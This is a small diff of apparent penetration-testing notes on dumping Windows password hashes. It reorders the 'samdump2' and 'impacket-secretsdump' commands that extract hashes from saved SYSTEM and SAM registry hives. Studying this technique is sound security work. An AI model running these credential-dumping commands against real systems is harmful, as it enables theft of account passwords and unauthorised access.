@@ -41,9 +41,11 @@ reg save hklm\system C:\Users\Noob\DEsktiop
 Dumping Hashes from SYSTEM and  SAM
 
 ```sh
-samdump2 SYSTEM SAM 
 
 impacket-secretsdump -sam ./SAM -system ./SYSTEM LOCAL
+
+# the order is important 
+samdump2 SYSTEM SAM 
 ```
 
 
